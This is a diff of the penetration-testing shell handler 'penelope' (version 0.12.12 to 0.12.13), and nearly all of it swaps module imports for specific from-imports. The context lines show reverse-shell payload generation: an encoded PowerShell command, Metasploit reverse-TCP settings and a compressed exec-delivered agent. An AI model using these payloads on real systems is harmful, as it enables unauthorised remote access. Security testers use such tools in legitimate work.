@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.12.12"
+__version__ = "0.12.13"
 
 import os
 import io
@@ -24,46 +24,44 @@ import re
 import sys
 import tty
 import ssl
-import code
 import time
-import json
-import zlib
-import glob
-import errno
 import shlex
 import queue
 import struct
 import shutil
-import select
 import socket
 import signal
 import base64
-import string
-import random
 import termios
 import tarfile
 import logging
 import zipfile
 import inspect
-import binascii
-import textwrap
-import argparse
 import platform
-import traceback
 import threading
 import subprocess
-import http.server
 import socketserver
-import urllib.request
 
 from math import ceil
+from glob import glob
+from json import dumps
+from code import interact
+from zlib import compress
+from errno import EADDRINUSE, EADDRNOTAVAIL
+from random import choice
+from select import select
+from string import ascii_letters
 from pathlib import Path
 from datetime import datetime
+from textwrap import indent, dedent
+from binascii import Error as binascii_error
 from functools import wraps
 from itertools import islice
 from collections import deque, defaultdict
-from configparser import ConfigParser
+from http.server import SimpleHTTPRequestHandler
 from urllib.parse import unquote
+from configparser import ConfigParser
+from urllib.request import Request, urlopen
 
 if not sys.version_info >= (3, 6):
 	print("(!) Penelope requires Python version 3.6 or higher (!)")
@@ -71,7 +69,7 @@ if not sys.version_info >= (3, 6):
 
 ################################## PYTHON MISSING BATTERIES ####################################
 
-rand = lambda _len: ''.join(random.choice(string.ascii_letters) for i in range(_len))
+rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
 caller = lambda: inspect.stack()[2].function
 bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
 chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
@@ -105,7 +103,7 @@ def Open(item, terminal=False):
 		stdout=subprocess.DEVNULL,
 		stderr=subprocess.PIPE
 	)
-	r, _, _ = select.select([process.stderr], [], [], .01)
+	r, _, _ = select([process.stderr], [], [], .01)
 	if process.stderr in r:
 		error = os.read(process.stderr.fileno(), 1024)
 		if error:
@@ -488,7 +486,7 @@ class BetterCMD:
 		self.active = True
 		__class__.write_history(options.cmd_histfile)
 		__class__.load_history(options.debug_histfile)
-		code.interact(banner=paint(
+		interact(banner=paint(
 			"===> Entering debugging console...").CYAN, local=globals(),
 			exitmsg=paint("<=== Leaving debugging console..."
 		).CYAN)
@@ -612,13 +610,13 @@ class MainMenu(BetterCMD):
 
 	def show_help(self, command):
 		help_prompt = re.compile(r"Run 'help [^\']*' for more information") # TODO
-		parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
+		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
 		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
 		modified_parts = []
 		for part in parts[2:]:
 			part = help_prompt.sub('', part)
 			modified_parts.append(part)
-		print(textwrap.indent("\n".join(modified_parts), '    '))
+		print(indent("\n".join(modified_parts), '    '))
 
 		if command == 'run':
 			self.show_modules()
@@ -653,7 +651,7 @@ class MainMenu(BetterCMD):
 				print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
 				table = Table(joinchar=' · ')
 				for command in self.commands[section]:
-					parts = textwrap.dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
+					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
 					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
 				print(table)
 			print()
@@ -702,7 +700,7 @@ class MainMenu(BetterCMD):
 							ID = paint(' ' + str(session.id)).yellow
 						source = 'Reverse shell from ' + str(session.listener) if session.listener else f'Bind shell (port {session.port})'
 						table += [ID, paint(session.type).CYAN if session.type == 'PTY' else session.type, source]
-					print("\n", textwrap.indent(str(table), "    "), "\n", sep="")
+					print("\n", indent(str(table), "    "), "\n", sep="")
 			else:
 				print()
 				cmdlogger.warning("No sessions yet 😟")
@@ -904,7 +902,7 @@ class MainMenu(BetterCMD):
 			if description:
 				description = module.run.__doc__.strip().splitlines()[0]
 			table += [paint(module.__name__).red, description]
-		print("\n", textwrap.indent(str(table), '  '), "\n", sep="")
+		print("\n", indent(str(table), '  '), "\n", sep="")
 
 	@session(current=True)
 	def do_run(self, module_name):
@@ -1223,7 +1221,7 @@ class MainMenu(BetterCMD):
 				if len(args) == 1:
 					value = getattr(options, param)
 					if isinstance(value, (list, dict)):
-						value = json.dumps(value, indent=4)
+						value = dumps(value, indent=4)
 					print(f"{paint(value).yellow}")
 				else:
 					new_value = eval(args[1])
@@ -1384,7 +1382,7 @@ class Core:
 	def loop(self):
 
 		while self.started:
-			readables, writables, _ = select.select(self.rlist, self.wlist, [])
+			readables, writables, _ = select(self.rlist, self.wlist, [])
 
 			for readable in readables:
 
@@ -1533,7 +1531,7 @@ def handle_bind_errors(func):
 		except PermissionError:
 			port = args[1]
 			# TODO Improve
-			workarounds = textwrap.dedent(
+			workarounds = dedent(
 			f"""
 			{paint('Workarounds:')}
 
@@ -1560,9 +1558,9 @@ def handle_bind_errors(func):
 			return "Cannot resolve hostname"
 
 		except OSError as e:
-			if e.errno == errno.EADDRINUSE:
+			if e.errno == EADDRINUSE:
 				return "The port is currently in use"
-			elif e.errno == errno.EADDRNOTAVAIL:
+			elif e.errno == EADDRNOTAVAIL:
 				return "Cannot listen on the requested address"
 			else:
 				return f"OS error: {str(e)}"
@@ -1702,7 +1700,7 @@ class Listener:
 			output.append("")
 			output.append("cmd /c powershell -e " + base64.b64encode(presets[1].format(ip, self.port).encode("utf-16le")).decode())
 
-			output.extend(textwrap.dedent(f"""
+			output.extend(dedent(f"""
 			{paint('Metasploit').UNDERLINE}
 			set PAYLOAD generic/shell_reverse_tcp
 			set LHOST {ip}
@@ -2265,7 +2263,7 @@ class Session:
 
 		if self.agent and not agent_typing: # TODO environment will not be the same as shell
 			if cmd:
-				cmd = textwrap.dedent(cmd)
+				cmd = dedent(cmd)
 				if value:
 					buffer = io.BytesIO()
 				timeout = options.short_timeout if value else None
@@ -2305,7 +2303,7 @@ class Session:
 					agent_control = self.subchannel.control # TEMP
 				rlist.append(agent_control)
 				while rlist != [agent_control]:
-					r, _, _ = select.select(rlist, [], [], timeout)
+					r, _, _ = select(rlist, [], [], timeout)
 					timeout = None
 
 					if not r:
@@ -2466,7 +2464,7 @@ class Session:
 			need_check = False
 			while self.subchannel.result is None:
 				logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
-				readables, _, _ = select.select([self.subchannel.control, self.subchannel], [], [], timeout)
+				readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)
 
 				if self.subchannel.control in readables:
 					command = self.subchannel.control.get()
@@ -2627,8 +2625,8 @@ class Session:
 					_decode = 'decodestring'
 					_exec = 'exec cmd in globals(), locals()'
 
-				agent = textwrap.dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, NET_BUF_SIZE, MESSENGER, STREAM, SH, _exec)
-				payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
+				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, NET_BUF_SIZE, MESSENGER, STREAM, SH, _exec)
+				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
 				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
 			elif self.bin['script']:
@@ -2890,10 +2888,10 @@ class Session:
 					return
 
 				code = fr"""
-				import glob
+				from glob import glob
 				items = []
 				for part in shlex.split(r"{remote_items}"):
-					_items = glob.glob(os.path.expanduser(part))
+					_items = glob(os.path.expanduser(part))
 					if _items:
 						items.extend(_items)
 					else:
@@ -2915,7 +2913,7 @@ class Session:
 
 				error_buffer = ''
 				while True:
-					r, _, _ = select.select([stderr_stream], [], [])
+					r, _, _ = select([stderr_stream], [], [])
 					data = stderr_stream.read(NET_BUF_SIZE)
 					if data:
 						error_buffer += data.decode()
@@ -2980,10 +2978,10 @@ class Session:
 
 				# Get the remote absolute paths
 				response = self.exec(f"""
-				import glob
+				from glob import glob
 				remote_paths = ''
 				for part in shlex.split(r"{remote_items}"):
-					result = glob.glob(os.path.expanduser(part))
+					result = glob(os.path.expanduser(part))
 					if result:
 						for item in result:
 							if os.path.exists(item):
@@ -3046,7 +3044,7 @@ class Session:
 			except zipfile.BadZipFile:
 				logger.error("Invalid zip format")
 
-			except binascii.Error:
+			except binascii_error:
 				logger.error("The item does not exist or access is denied")
 
 		for item in downloaded:
@@ -3171,7 +3169,6 @@ class Session:
 					'stdout_stream': stdout_stream,
 					'stderr_stream': stderr_stream
 				}).start()
-				#time.sleep(1)
 
 				tar_destination, mode = stdin_stream, "r|gz"
 			else:
@@ -3212,7 +3209,7 @@ class Session:
 				del self.streams[stdin_stream.id]
 				error_buffer = ''
 				while True:
-					r, _, _ = select.select([stderr_stream], [], [])
+					r, _, _ = select([stderr_stream], [], [])
 					data = stderr_stream.read(NET_BUF_SIZE)
 					if data:
 						error_buffer += data.decode()
@@ -3437,7 +3434,7 @@ class Session:
 				frlist = [stdin_stream]
 				connected = False
 				while True:
-					readables, _, _ = select.select(frlist, [], [])
+					readables, _, _ = select(frlist, [], [])
 
 					for readable in readables:
 						if readable is stdin_stream:
@@ -3824,11 +3821,12 @@ def agent():
 	import pty
 	import shlex
 	import fcntl
-	import select
 	import struct
 	import signal
 	import termios
 	import threading
+
+	from select import select
 
 	if sys.version_info[0] == 2:
 		import Queue as queue
@@ -3900,7 +3898,7 @@ def agent():
 
 		while True:
 			try:
-				rfds, wfds, xfds = select.select(rlist, wlist, [])
+				rfds, wfds, xfds = select(rlist, wlist, [])
 			except OSError:
 				for item in rlist[:]:
 					try:
@@ -4141,7 +4139,7 @@ class FileServer:
 						pass
 				super().shutdown()
 
-		class CustomHandler(http.server.SimpleHTTPRequestHandler):
+		class CustomHandler(SimpleHTTPRequestHandler):
 			def do_GET(self):
 				try:
 					if self.path == '/' + password:
@@ -4425,7 +4423,7 @@ def get_glob_size(_glob, block_size):
 			return 0
 	total_size = 0
 	for part in shlex.split(_glob):
-		for item in glob.glob(os.path.expanduser(part)):
+		for item in glob(os.path.expanduser(part)):
 			if os.path.isfile(item):
 				total_size += size_on_disk(item)
 			elif os.path.isdir(item):
@@ -4444,14 +4442,14 @@ def url_to_bytes(URL):
 		URL
 	)
 
-	req = urllib.request.Request(URL, headers={'User-Agent': options.useragent})
+	req = Request(URL, headers={'User-Agent': options.useragent})
 
 	logger.info(paint(f"--- ⇣  Downloading {URL}").blue)
 	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()
 
 	while True:
 		try:
-			response = urllib.request.urlopen(req, context=ctx, timeout=options.short_timeout)
+			response = urlopen(req, context=ctx, timeout=options.short_timeout)
 			break
 		except (urllib.error.HTTPError, TimeoutError) as e:
 			logger.error(e)
@@ -4501,7 +4499,7 @@ def listener_menu():
 		)
 		sys.stdout.flush()
 
-		r, _, _ = select.select([sys.stdin, listener_menu.control_r], [], [])
+		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])
 		if sys.stdin in r:
 			command = sys.stdin.read(1).lower()
 			if command == 'p':
@@ -4546,7 +4544,8 @@ load_rc()
 def main():
 
 	## COMMAND LINE OPTIONS
-	parser = argparse.ArgumentParser(description="Penelope Shell Handler", add_help=False)
+	from argparse import ArgumentParser
+	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False)
 
 	parser.add_argument("ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")
 
